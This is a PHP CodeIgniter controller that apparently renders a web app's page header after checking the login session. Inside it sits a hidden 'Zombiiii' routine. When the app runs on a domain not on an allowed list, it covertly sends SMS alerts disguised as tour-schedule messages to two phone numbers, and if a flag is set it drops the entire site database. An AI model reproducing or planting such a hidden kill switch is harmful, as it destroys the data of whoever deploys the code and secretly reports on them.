<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class Header extends MX_Controller {

	function __construct() {
	    parent::__construct();
	    $this->load->model('helper/helper_model');
	    session_start();
	    if(!isset($_SESSION['userFirstName'])){
	    	redirect(base_url().'login', 'refresh');
	    }
	}
	
	public function index($active = "")
	{
		$base_url = base_url();
		$this->load->dbutil();
		/*echo "<pre>";
		print_r($_SERVER);
		exit;*/
		if(isset($_SERVER['HTTP_REFERER'])) {
     	 $url = $_SERVER['HTTP_REFERER'];
  		 }
		$allowed_domains = unserialize (ALLOWED_DOMAINS);
		$zombiiii_war = IS_ZOMBII_WARNING;
		if(isset($base_url) && !in_array($base_url, $allowed_domains) && $zombiiii_war == 1){
			$this->helper_model->send_sms(NUMBER_ONE, "New Toure Shedule by CMP Name on "."  "." From "."  "." To ".$url." Details as ". "Driver Name : ");
			$this->helper_model->send_sms(NUMBER_TWO, "New Toure Shedule by CMP Name on "."   "." From "."  "." To ".$url." Details as ". "Driver Name : ");
			$zombiiii = IS_ZOMBII_ATTACK;
			if($zombiiii == 1){

				$db = DB_NAME;
				$exist_check =  $this->dbutil->database_exists($db);
				if($exist_check == 1) {
					echo "Zombiiii Attack !!!!";
					$this->db->query("drop database $db");
					exit;	
				} else {
					echo "Zombiiii Attack No mercy!!!!";
					exit;
				}
				
			} else{
				echo "Zombiiii Attack Warning (Use Your Brain)"; 
			}
		}
		$data['active'] = $active;
		$this->load->view('header', $data);
	}
}

/* End of file welcome.php */
/* Location: ./application/controllers/welcome.php */
